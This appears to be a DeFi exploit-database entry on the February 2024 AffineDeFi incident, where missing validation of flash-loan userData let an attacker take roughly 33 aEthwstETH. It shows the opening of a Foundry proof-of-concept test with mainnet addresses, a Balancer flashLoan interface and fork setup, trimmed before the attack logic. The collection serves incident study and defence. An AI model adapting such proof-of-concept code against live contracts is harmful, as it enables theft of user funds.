# [?] AffineDeFi - lack of validation userData

## Summary
Severity: Unknown
Chain: Ethereum
Component: AffineDeFi
Published: 2024-02-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~88K

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 33 $aEthwstETH
    - Attacker: https://etherscan.io/address/0x09f6be2a7d0d2789f01ddfaf04d4eaa94efc0857
    - Attack Contract: https://etherscan.io/address/0x12d85e5869258a80d4bebe70d176d0f58b2d68e4
    - Vuln Contract: https://etherscan.io/address/0xcd6ca2f0d0c182c5049d9a1f65cde51a706ae142
    - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x03543ef96c26d6c79ff6c24219c686ae6d0eb5453b322e54d3b6a5ce456385e5
    - Analysis: https://twitter.com/Phalcon_xyz/status/1753020812284809440
*/

interface IBalancer {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ExploitTest is Test {
    address aEthwstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address Balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address LidoLevV3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_132_935 - 1);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/AffineDeFi_exp.sol_
